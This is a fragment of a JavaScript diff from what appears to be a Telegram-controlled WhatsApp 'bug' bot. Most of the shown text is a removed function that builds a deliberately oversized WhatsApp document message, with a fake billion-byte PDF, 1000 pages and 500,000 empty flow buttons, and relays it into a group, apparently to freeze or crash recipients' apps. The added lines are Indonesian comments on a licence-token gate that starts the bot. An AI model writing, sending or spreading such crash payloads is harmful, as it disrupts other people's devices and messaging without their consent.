-documentMessage: {
-url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
-          mimetype: "application/pdf",
-          fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
-          fileLength: 999999999,
-          pageCount: 1000,
-          mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
-          fileName: "billy.pdf",
-          fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
-          directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
-          mediaKeyTimestamp: "1779839963",
-          thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
-          thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
-          thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
-          jpegThumbnail: null,
-          contextInfo: {},
-          thumbnailHeight: 999,
-          thumbnailWidth: 999
-        }
-      },
-      body: {
-        text: "AlpzzyOfficiaL¡!"
-      },
-      nativeFlowMessage: {
-        buttons: Array.from({ length: 500000 }, () => ({}))
-      }
-    }
-  }, {});
-
-  await sock.relayMessage(groupJid, Memek.message, {
-    messageId: Memek.key.id
-  });
-}
 //end Func
+
+// Gate bot Telegram: if valid -> run normal, else -> do nothing.
+// Karena keputusan lewat if/else (bukan process.exit), tidak ada satu titik pun
+// yang bisa di-override user untuk melewati proteksi: kalau token tidak valid,
+// bot.launch() memang tidak pernah dipanggil.
 tokenGate.then((tokenOk) => {
   if (tokenOk) {
+    // Token valid → start bot seperti biasa.
     bot.launch();
   } else {
+    // Token tidak valid/gagal cek → do nothing.
   }
 });
